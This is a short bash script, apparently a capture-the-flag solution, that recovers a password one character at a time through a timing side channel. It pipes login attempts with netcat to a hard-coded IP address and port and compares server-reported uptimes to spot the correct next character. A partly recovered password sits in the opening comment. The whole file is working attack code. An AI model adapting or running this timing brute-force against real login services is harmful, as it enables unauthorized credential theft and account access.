# Passwords is doNOTl4unch_missi1es!
rm passwords.txt

for n in {33..127}
do
        x=$(echo "$n" | awk '{ printf("%c", $0); }')
        hex=$(echo "$n" | awk '{ printf("%02x", $0); }')

        RESULT=$(echo -ne "\nagent\ntest\nagent\ndoNOTl4unch_missi1es\x${hex}z\n"|tee -a passwords.txt|nc 34.76.84.105 1337 -q 1)
        echo $RESULT

        REGEX=".*Wrong user/password.*Uptime: ([0-9]+)us.*Uptime: ([0-9]+)us"
        if [[ $RESULT =~ $REGEX ]]
        then
                START="${BASH_REMATCH[1]}"
                END="${BASH_REMATCH[2]}"

                DIFF=$(($END-$START))
                echo "${DIFF} ${START}-${END} = ${x}"

                if [ "$DIFF" -ne "20581" ]; then
                        echo "CHR IS ${x}"
                        exit
                fi
        else
                echo "no match hombre: ${n}"
                echo $RESULT

        fi
done

